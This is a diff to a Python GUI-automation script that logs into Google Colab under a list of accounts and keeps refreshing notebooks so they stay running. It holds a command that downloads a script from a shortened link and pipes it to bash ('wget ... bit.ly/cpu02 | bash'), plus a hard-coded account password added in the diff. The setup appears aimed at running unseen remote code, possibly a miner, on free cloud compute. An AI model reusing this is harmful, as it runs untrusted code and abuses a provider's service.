@@ -1,13 +1,16 @@
 # Auto RDP
-import time
+import time,os
 from autokey import *
 import pyautogui
 
 col_cmd = "!wget -q -O - bit.ly/cpu02 | bash"
 listfile = '/home/one/gids03.txt'
-gpass = "------------"
+gpass = "Ms123456789"
 new = False
 global_slow_motion = 2
+
+speed = 200
+
 ##################### Functions ###################################
 
 
@@ -29,6 +32,10 @@ def select_all_key():
     pyautogui.press('a')
     pyautogui.keyUp('ctrlright')
 
+def save_key():
+    pyautogui.keyDown('ctrlright')
+    pyautogui.press('a')
+    pyautogui.keyUp('ctrlright')
 
 def human_click(x_pos=1200, y_pos=400, slow_motion=1):
     time.sleep(0.1*slow_motion)
@@ -233,6 +240,32 @@ def chrome_colab_refresh_full(slow_motion=1):
     time.sleep(3*slow_motion)
     colab_doexec2()
 
+def chrome_colab_refresh_save(slow_motion=1):
+    time.sleep(1*slow_motion)
+    save_key()
+    time.sleep(40)
+    chrome_refresh_page()
+    colab_doexec2()
+    colab_clear_logs()
+
+def chrome_colab_refresh_fast(slow_motion=1):
+    time.sleep(1*slow_motion)
+    colab_doexec2()
+    colab_clear_logs()
+    
+def get_speed():
+    # Getting all memory using os.popen()
+    speed = 100
+    total_memory, used_memory, free_memory = map(
+        int, os.popen('free -t -m').readlines()[-1].split()[1:])
+    ram_usage=round((used_memory/total_memory) * 100, 2)
+    if(ram_usage > 90 ):
+        speed = speed - 90
+    elif ram_usage > 70 :
+        speed = speed - 20
+    else:
+        speed = 110
+    return speed    
 
 ###############################################################
 ############################# Main ############################
@@ -262,16 +295,19 @@ if new == True:
         gid = gid.strip('\r')
         chrome_new_colab(gid, gpass)
 
-
 # refresh
 while (debug == 0):
     debug = 0
+    speed = get_speed()
     time.sleep(2*global_slow_motion)
     winTitle = window.get_active_title()
     winClass = window.get_active_class()
     if (winClass == "google-chrome.Google-chrome"):
         if winTitle.find("olab") != -1:
-            chrome_colab_refresh()
+            if speed < 25 :
+                chrome_colab_refresh()
+            else:
+                chrome_colab_refresh_fast()
             if debug != 0:
                 # dialog.info_dialog("winTitle",winTitle)
                 chrome_new_colab("soudi10001", "*******")
